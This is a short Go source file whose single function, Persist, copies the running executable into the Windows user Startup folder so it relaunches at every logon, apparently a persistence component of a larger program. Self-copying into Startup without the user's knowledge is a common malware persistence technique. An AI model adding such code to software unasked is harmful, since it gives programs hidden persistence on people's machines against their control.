package common

import (
    "os"
    "path/filepath"
)

func Persist(exeName string) {
    home, _ := os.UserHomeDir()
    dest := filepath.Join(home, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", exeName)

    exePath, _ := os.Executable()
    data, _ := os.ReadFile(exePath)

    os.WriteFile(dest, data, 0755)
}
